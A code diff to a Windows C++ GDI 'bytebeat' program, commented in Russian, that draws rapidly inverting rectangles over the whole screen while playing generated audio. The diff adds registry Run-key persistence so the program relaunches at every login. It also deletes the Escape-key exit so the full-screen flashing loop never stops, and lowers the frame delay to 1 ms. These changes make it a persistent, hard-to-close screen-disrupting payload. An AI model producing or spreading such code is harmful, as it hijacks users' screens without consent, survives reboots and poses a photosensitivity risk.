@@ -9,13 +9,32 @@
 const int SAMPLE_RATE = 8000; 
 const int BUFFER_SIZE = 4000; 
 
-// Глобальные переменные старого типа для совместимости с Vista/7
 volatile DWORD globalT = 0;
 volatile bool isRunning = true;
 
 // Первая оригинальная формула Bytebeat
 inline BYTE GenerateBytebeat(DWORD t) {
     return static_cast<BYTE>((((t * (t >> 8 | t >> 9) & 46 & t >> 8)) ^ (t & t >> 13 | t >> 6)) & 0xFF);
+}
+
+// Функция для автоматического добавления программы в автозагрузку реестра
+void RegisterMyProgramForStartup() {
+    HKEY hKey = nullptr;
+    // Путь к ветке автозагрузки текущего пользователя
+    const char* czStartName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    // Имя параметра в реестре для вашей программы
+    const char* czValueName = "GdiBytebeatEffects";
+
+    // Получаем полный путь к текущему запущенному exe-файлу
+    char szProgPath[MAX_PATH];
+    GetModuleFileNameA(NULL, szProgPath, MAX_PATH);
+
+    // Открываем раздел реестра с правами на запись
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, czStartName, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        // Записываем путь к файлу в реестр
+        RegSetValueExA(hKey, czValueName, 0, REG_SZ, (const BYTE*)szProgPath, lstrlenA(szProgPath) + 1);
+        RegCloseKey(hKey);
+    }
 }
 
 // -------------------------------------------------------------
@@ -33,7 +52,6 @@ DWORD WINAPI AudioThreadFunc(LPVOID lpParam) {
     waveOutPrepareHeader(hWaveOut, &waveHdr1, sizeof(WAVEHDR));
     waveOutPrepareHeader(hWaveOut, &waveHdr2, sizeof(WAVEHDR));
 
-    // Первичное наполнение буферов
     for (int i = 0; i < BUFFER_SIZE; ++i) audioBuf1[i] = GenerateBytebeat(InterlockedIncrement(&globalT));
     for (int i = 0; i < BUFFER_SIZE; ++i) audioBuf2[i] = GenerateBytebeat(InterlockedIncrement(&globalT));
 
@@ -70,6 +88,9 @@ DWORD WINAPI AudioThreadFunc(LPVOID lpParam) {
 // ГЛАВНЫЙ ПОТОК: Безумная непрерывная графика
 // -------------------------------------------------------------
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Вызываем функцию добавления в автозагрузку при старте
+    RegisterMyProgramForStartup();
+
     srand(static_cast<unsigned int>(time(0)));
 
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
@@ -90,42 +111,37 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     HANDLE hAudioThread = CreateThread(NULL, 0, AudioThreadFunc, hWaveOut, 0, NULL);
 
-    // Главный цикл графических эффектов
-    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
+    // Изменено на истинно бесконечный цикл — проверка GetAsyncKeyState(VK_ESCAPE) полностью удалена
+    while (true) {
         DWORD t = globalT; 
         BYTE soundValue = GenerateBytebeat(t);
 
-        // УСЛОВИЕ УБРАНО: Теперь отрисовка идет ПОСТОЯННО и без пауз
         HDC hdcScreen = GetDC(0);
 
-        // Размеры динамически зависят от текущего звукового байта
         int w = (soundValue % 200) + 50;  
         int h = ((soundValue >> 2) % 200) + 50;  
         int x = rand() % (screenWidth - w);
         int y = rand() % (screenHeight - h);
 
-        // Цвет меняется строго по алгоритму трека
         COLORREF syncColor = RGB(soundValue, (soundValue ^ (t >> 4)) & 0xFF, (t >> 8) & 0xFF);
         HBRUSH hBrush = CreateSolidBrush(syncColor);
         HBRUSH hOldBrush = (HBRUSH)SelectObject(hdcScreen, hBrush);
 
-        // Постоянная инверсия
         PatBlt(hdcScreen, x, y, w, h, PATINVERT);
 
         SelectObject(hdcScreen, hOldBrush);
         DeleteObject(hBrush);
         ReleaseDC(0, hdcScreen);
 
-        // Задержка снижена до 1 мс для максимального FPS и плотности эффекта
         Sleep(1); 
     }
 
+    // Этот участок кода теперь недостижим в нормальных условиях
     isRunning = false;
     if (hAudioThread != NULL) {
         WaitForSingleObject(hAudioThread, INFINITE);
         CloseHandle(hAudioThread);
     }
-
     waveOutReset(hWaveOut);
     waveOutClose(hWaveOut);
 
